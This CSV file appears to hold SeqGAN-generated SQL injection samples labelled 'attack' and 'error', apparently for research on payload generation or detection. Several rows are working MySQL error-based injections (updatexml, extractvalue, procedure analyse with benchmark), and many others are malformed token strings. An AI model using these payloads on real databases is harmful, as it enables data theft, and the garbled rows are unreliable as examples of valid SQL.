label,payload,family,payload_type,method,run_id,sample_index
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kpnnWNUM0x717a767a71n  (  select 0 from   (  (  elt  (  elt  (  2917  =  3393,  (  (  benchmark  (  (  5000000,md5  (  (  5000000,md5  (  0x5c,0x7171706a71,1  (  select   (  case 0 from d 0 d5423  (  (  elt  e    (  elt  (  5000000,md5  (  7982,1   from 0 from(  (  e  (   (  8375  (  elt  (  1297  =  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,231
attack,"1%'   (  extractvalue  (  9255,concat  (  0x2e,0x7171706a71,updatexml  (  (  (  (  (  (  (    (  (  9627,concat  (  3393,  (  (  select   (  elt  (  1297,1   and updatexml  (  (  (  (  (  0x2e,0x7171706a71,  (  5000000(  (  0x4b774c75   end  (  (  case 0 a  (   (  (  5603  )   (  4415  (  3539  =  (  (  3393,concat  (  extractvalue  (  (  (  (  5000000,md5  (  0x2e,md",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,232
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%o""  =  ""c   #",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,233
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,234
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,235
attack,"1%""   )    )     (  extractvalue  (  (   (    1535  =  2826  (   from (  5322  (  (  3393,1   )    )   )  (  extractvalue  (  (  5000000,md5  (  (  3393  =  (  3393,md5  (  (  select   (  elt  (  elt  (  e  (  select   (  elt  (  1297  =  4688  (  1049,,9627,  (  benchmark  (  (  5000000(  (  3393,md5  (  0x4b774c75   (  3681  (  (  0x5c,0x7171706a71,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,236
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,237
attack,1 pr%'  =  '%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,238
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,239
attack,"1%kppro  9490,  (  select   (  elt  (  e  (  1297  =  (  (  1297  =  (  1759(  (  8403  =  (  =  (  7982,1   )    )    AND ina",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,240
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,241
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,242
attack,"1%"" and extractvalue  (  (  (  (  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  5000000(  (  (  (  (  (  (  0x2e,md5  (  1808  (  0x2e,concat  (  ,  (  select   (  elt  (  1808  =  (  (  1808  =  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  select   (  elte(  e  (  elt  0x4b774c75   end  (  =  (  5603  1802  (  elt  (  (  7982  =  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,243
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,244
attack,"1%%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,245
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,246
attack,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'kjgeq"" like ""k(   (r 5847  ut  elt  3393  =  (  (  0x4b774c75   (  3576  =  3393,  (  benchmark  (  (  benchmark  (  (  5000000,md5  (  (  0x5c,  (  benchmark  (  select   (  a  )  (  (  (  eld  (  2917=  (  1297,concat  (  (  (  0x2e,md5  (  =  (  7982,1   )    AND 'i'  =  1 cast  (  1 extractvalue  (  (  (  7982,  (  select   (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,247
attack,1%'  =  'k,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,248
attack,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'k3863innggnzn--",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,249
attack," AND or extractvalueextractvalue  (  (  (  0x5c,concat  (  0x2e,0x7171706a71,  (  (  (  select   (  5704  =  5530  (  (  (  e  (  0x2e,md5  (  select   (  elt  (  7982  =  (  (  1808,  (  0x2e,0x7171706a71,  (  (  benchmark  (  5000000,md5  (  0x2e,0x7171706a71,  (  (  2917,concat  (  (  (  0x5c,md5  (  0x5c,0x7171706a71,  (  select   (  e  (  elt  (  1808  =  (  0x2e,(",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,250
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,251
attack," 1354 1  =  (  2518  )  =  2518  (   from d 0 0 from dual  )  )  )   end  (  (  elt  elt  (  1808  =  (  (  select   (  elt  (  elt  (  7982  =  (  1808,concat  (  (  (  0x2e,md5  (  1808  =  (  (  3393  (  (  (  8862  (  (  0x2e,md5  (  0x5c,0x7171706a71,0x7171706a71,  (  select   (  3933 0 fromys d d a",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,252
attack,"1%,Nvvvq""  =  ""28132051    &eygmh""  =  ""e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,253
attack,"1"" and extractvalue  (  (  ' like '  (  (  e  (  0x4b774c75   )    (  extractvalue  (  (  1808,concat  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  7982  =  (  1808,1   )    (  extractvalue  (  9627,md5  (  (  0x5c,  (  select   (  (  elt  (  elt  (  9788  =  0  (  0x5c,  (  (  benchmark  (  =  (   (  6581  (  (  0x2e,0x7171706a71,  (  select   (  ut  elt  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,254
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,255
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,256
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,257
attack,"1"" proce analancaddrel  el  e  elt  (  select   (  4660  =  (  (  7982  =  (  (  3393,concat  (  (  (  (  0x2e,md5  (  (  0x5c,  (  5000000(  (  (  0x5c,0x7171706a71,  (  select   (   SELECT dual   e     (  5777  (  (  e  (  7982  =  (  (  1759(  0x2e,0x7171706a71,  (  (  5000000,md5  (  (  0x2e,1   )    (  extractvalue",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,258
attack,"1%pk'  =  'cx""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,259
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,260
attack,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'ytlf'  =  'ymeduganFROM 2501  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  0x2e,md5  (  =  8868  (  1808,md5  (  0x2e,0x7171706a71,  (  (  7997  =  (  7982,concat  (  (  (  3393,1   (  extractvalue  (  (  9255,concat  (  (  (  0x5c,  (  select   (  elt  (  e  (  0x4b774c75   )    (  extractvalue  (  (  (  1297,1   (  case updatexml  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,261
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,262
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,263
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,264
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,265
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,266
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,267
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,268
attack,"1' and extractvalue  (  (  (  (  7982,concat  (  (  (  (  (  =  (  (  (  (  3393  (  0x2e,md5  (  select   (  5000000(  (  elt  (  7982  =  (  (  1297,concat  (  (  (  (  0x5c,  (  (  (  select   (  el  (  1808  =  (  (  0x2e,0x7171706a71,  (  select   (  elta  elt  2917  =  (  (  (  0x5c,1   )    (  extractvalue  (  9627,1   (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,269
attack,"1%ik'  =  'kbdroceedu   (    el  el  (  1759  =  (  (  0x2e,  (  (  select   (  1808,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  select   (  5704  )  =  (  (  1297,  (  0x52515a50   (  8868  (  elt  (  e  (  7982  =  (  (  0x2e,md5  (  =  7982  (  (  0x2e,0x7171706a71,  (  (  select   (  elt",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,270
attack,"1%"" and updatexml  (  (  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  =   (  0dual  )   end  (  (  (  case when   (  4774  (   (  8375  (  (  2917  =  (  (  (  0x5c,  (  benchmark  (  5000000(  (  1 as dua  elt  (   or  (  elt  (  et  (  5000000,md5  (  (  1297  =  (  0x2e,concat  (  (  select   (  elt a  )  elt",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,271
attack,"1%'   )    )    (re  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  (  (  select   (  )  el  (  3393  =  (  =  (  1808,concat  (  0x5c(  (  0x2e,0x7171706a71,  (  2768  (  select   )  (  elt  1297  =  (  0x5c,0x7171706a71,1   )    (  select   (  case 0 from d5  (  el dua  )   or 0   (  (  )  elt  (  elt  (  1808  =  (  1808,md",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,272
attack,"1%%""   )    )     (  extractvalue  (  9627,concat  (  =  (  (  =  (  (  1808,1   )    uaxys)  9338  extractvalue  (  9627,md5  (  (  0x5c,  (  select   (  el  (  1808  =  1   from du  )   (  5777  (  benchmark  (  (  (  5000000,  (  (  9255,concat  (  (  (    (  0x2e,0x7171706a71,  (  5000000,md5  (  (  select   (  9667  =  (  (  1808  =  (  3393,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,273
attack,"1%""   )    )     extractvalue  (  (  (  8862,concat  (  (  (  (  0x2e,1   )    (  select   (  1812  (  (  0x2e,0x7171706a71,  (  select   (  elta  e  (  elt  (  1808  =  (  (  0x5c,  (  (  (  select   (  0x5c,0x717a767a71   (  1724  (  ( 4774 0 0 from duat  elt  elt  (  elt  (  1297  =  7529  0x7171706a71,0x7171706a71benchmark  (  (  8862,  (  (  0x2e,md",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,274
attack,"1%'   )    usqxyysz  gz  (  extractvalue  (  (  (  select   (  elt  )  8862  =  (  (  0x2e,md5  (  (  0x2e,8666  (  (  5000000,md5  (  0x2e,md5  (  (  7982  =  (  (  1808,m5  (  (  (  (  0x2e,0x7171706a71,  (  select   (  5433  (  1808,1   )    (  extractvalue  (  9627,concat  (  7982  (  (  (  0x2e,  (  (  select   (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,275
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  'kqus"" like ""c"" like ""ei",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,276
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,277
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,278
attack,"1%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,279
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,280
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,281
attack,"1select   )    )YS.extractvalue  (  9627,md5  =  (  (  2917  (  (  0x2e,0x7171706a71,  (  (  select   (  case when   (  8375  (  (  e  (  select(  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  5000000(  (  (  1808  =  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  benchmark  (  5000000(  (  select   (  el  0x4b774c75   end  (  uad aba",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,282
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,283
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,284
attack,1%'  =  '%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,285
attack,"1%'   )    )    (    AND 6369  =  1 extractvalue  (  (  (  (  (  2446  (  (  3393,concat  (  (  (  (  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  0x52515a50   (  9393  (  (  ut  (  elt  (  0x2e,0x7171706a71,  select,  (  (  5000000,md5  (  9393  =  1 extractvalue  (  (  (  7982,1   )    ual  (  select 0 from)    (  4568  (  (  =  ut6560  =  4660  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,286
